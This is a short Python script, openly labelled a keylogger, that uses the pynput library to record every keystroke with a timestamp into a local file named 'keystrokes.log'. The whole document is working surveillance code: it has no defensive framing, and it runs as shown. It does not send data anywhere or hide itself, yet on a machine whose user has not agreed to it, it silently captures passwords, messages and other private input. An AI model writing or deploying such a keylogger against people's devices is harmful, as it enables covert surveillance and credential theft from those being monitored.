from pynput.keyboard import Key, Listener
import logging

# Configure logging
log_file = 'keystrokes.log'
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Function to log keystrokes
def on_press(key):
    logging.info(str(key))

# Start listener
with Listener(on_press=on_press) as listener:
    print("Keylogger started...")
    listener.join()
